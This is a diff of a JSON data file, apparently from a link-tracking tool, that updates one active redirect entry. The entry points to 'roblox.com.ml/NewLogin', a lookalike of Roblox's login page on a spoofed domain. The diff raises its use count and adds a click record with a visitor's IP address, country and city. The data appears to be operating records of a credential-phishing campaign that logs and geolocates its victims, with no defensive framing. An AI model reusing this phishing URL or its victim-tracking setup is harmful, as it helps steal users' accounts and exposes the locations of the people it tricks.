@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 716,
+    "useCount": 717,
     "createdBy": "admin",
     "clicks": [
       {
@@ -5840,6 +5840,14 @@
         "city": "Lima",
         "flag": "🇵🇪",
         "countryCode": "PE"
+      },
+      {
+        "timestamp": 1777138072440,
+        "ip": "212.58.120.82",
+        "country": "Georgia",
+        "city": "Tbilisi",
+        "flag": "🇬🇪",
+        "countryCode": "GE"
       }
     ]
   },
